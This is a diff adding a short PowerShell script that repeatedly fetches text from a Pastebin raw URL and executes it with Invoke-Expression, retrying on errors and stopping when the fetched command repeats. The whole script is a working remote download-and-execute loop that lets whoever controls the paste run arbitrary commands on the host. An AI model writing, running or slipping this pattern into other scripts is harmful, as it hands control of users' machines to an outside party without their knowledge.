@@ -1,0 +1,26 @@
+while ($true) {
+    try {
+        $command = (curl "pastebin.com/raw/3ywifLXS").Content
+    }
+    catch {
+        Write-Error "Error retrieving command: $($_.Exception.Message)"
+        Start-Sleep -Seconds 5 # Wait before retrying
+        continue # Skip to the next iteration of the loop
+    }
+
+    if ($command -eq $command2) {
+        Write-Host "Command unchanged. Exiting."
+        return
+    }
+    else {
+        try {
+            Invoke-Expression $command -ErrorAction Stop #irm alias is Invoke-RestMethod. IEX is Invoke-Expression
+            $command2 = $command
+        }
+        catch {
+            Write-Error "Error executing command: $($_.Exception.Message)"
+            Start-Sleep -Seconds 5 # Wait before retrying
+        }
+    }
+    Start-Sleep -Seconds 5 # Wait before checking again
+}
